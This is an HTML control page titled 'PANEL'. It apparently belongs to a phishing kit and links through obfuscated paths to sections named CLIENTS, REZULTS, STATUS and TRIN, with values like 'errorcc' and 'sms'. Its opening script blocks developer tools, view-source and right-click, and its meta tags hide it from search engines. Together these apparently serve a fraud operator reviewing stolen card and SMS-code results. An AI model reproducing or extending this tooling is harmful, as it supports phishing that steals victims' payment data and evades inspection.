<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
<!doctype html>
<html>
<link rel="icon" href="./IMG/Control-panel-windows-10-icon.png">
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">

        <title>PANEL</title>
    </head>

    <body>
        
        <div class="container text-center pt30 pb30">
            <form method="post" action="./CLIENTS.48h606q36Dr215p73lENDra7i223g706V8p3d78hQ1Mrj714rERi6662GcdSRAtW06B1086IwR71e3XHw52756UYhN73t5100Qr5/"><button type="submit" class="btn btn-dark" name="to" value="errorcc">CLIENTS [ 👨 ]</button></form><br>
			<form method="post" action="./REZULTS.77T3V07V56s5j14kcWEm121WCL361xvGY5K775J05F3T7jJ215f4N88t2H4fS8XFNb1ij615127528m8xDv82CdQI4hK5T6876j2/"><button type="submit" class="btn btn-success" name="to" value="sms">REZULTS [ 🤑 ]</button></form><br>
                <form method="post" action="./STATUS.6jl18sTE8hw714IRP782rJnl576f523d6SY7De655474yG84Fd5h464r612O18Da713254lkOBXX86Wdt0054Ou456kf21tA2rG5/"><button type="submit" class="btn btn-secondary" name="to" value="success">STATUS [ ⚙️ ]</button></form><br>
				<form method="post" action="./TRIN.66g3mlG4VC6R7L81kRXBJ1TeiQ7bo7k8q0480Q3AE52DR3H48PR5jLqMD4PY7Tm2k7Aa2uv8m8mI4B7I1vUQ75Tp07qM0Q21KRlM/"><button type="submit" class="btn btn-primary" name="to" value="app">TRIN [ 🔉 ]</button></form>
			

            
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>
            $('button[type="button"]').click(function(){
                var href = $(this).attr('href');
                $(href).slideToggle(100);
            });
        </script>

    </body>

</html>